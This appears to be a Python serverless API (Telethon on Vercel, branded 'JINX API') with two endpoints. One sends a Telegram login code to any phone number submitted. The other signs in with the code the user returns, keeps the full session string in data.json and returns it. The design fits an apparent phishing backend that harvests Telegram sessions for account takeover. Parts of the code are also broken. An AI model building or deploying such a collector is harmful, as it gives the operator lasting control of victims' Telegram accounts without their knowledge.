# api/index.py — FLASK ASYNC (100% JALAN DI VERCEL!)
import os
import json
from telethon import TelegramClient
from telethon.sessions import StringSession

# BACA session.txt
def get_session():
    if os.path.exists('session.txt'):
        with open('session.txt', 'r') as f:
            for line in f.read().strip().split('\n'):
                if line.startswith('SESSION_STRING='):
                    return line.split('=', 1)[1]
    return None

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
SESSION_STRING = get_session()

if not all([API_ID, API_HASH, SESSION_STRING]):
    def handler(event, context):
        return {
            'statusCode': 500,
            'body': json.dumps({'error': 'ENV / session.txt RUSAK!'})
        }

DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

async def send_code(phone):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        await client.disconnect()
        return {"success": True, "hash": res.phone_code_hash}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def login(phone, code, hash_code):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code=code, phone_code_hash=hash_code)
        sess = client.session.save()
        data = load()
        data[phone] = {"session": sess}
        save(data)
        await client.disconnect()
        return {"success": True, "session": sess}
    except Exception as e:
        return {"success": False, "error": str(e)}

# VERCEL HANDLER
def handler(event, context):
    path = event['path']
    method = event['httpMethod']

    if path == '/' and method == 'GET':
        return {
            'statusCode': 200,
            'body': json.dumps({"message": "JINX API JALAN!"})
        }

    if path == '/send_code' and method == 'POST':
        import urllib.parse
        phone = urllib.parse.parse_qs(event['body']).get('phone', [None])[0]
        if not phone:
            return {'statusCode': 400, 'body': json.dumps({'error': 'no phone'})}
        import asyncio
        result = asyncio.get_event_loop().run_until_complete(send_code(phone))
        return {'statusCode': 200, 'body': json.dumps(result)}

    if path == '/login' and method == 'POST':
        import urllib.parse
        body = urllib.parse.parse_qs(event['body'])
        phone = body.get('phone', [None])[0]
        code = body.get('code', [None])[0]
        hash_code = body.get('hash', [None])[0]
        if not all([phone, code, hash_code]):
            return {'statusCode': 400, 'body': json.dumps({'error': 'missing'})}
        import asyncio
        result = asyncio.get_event_loop().run_until_complete(login(phone, code, hash_code))
        return {'statusCode': 200, 'body': json.dumps(result)}

    return {'statusCode': 404, 'body': json.dumps({'error': 'not found'})}
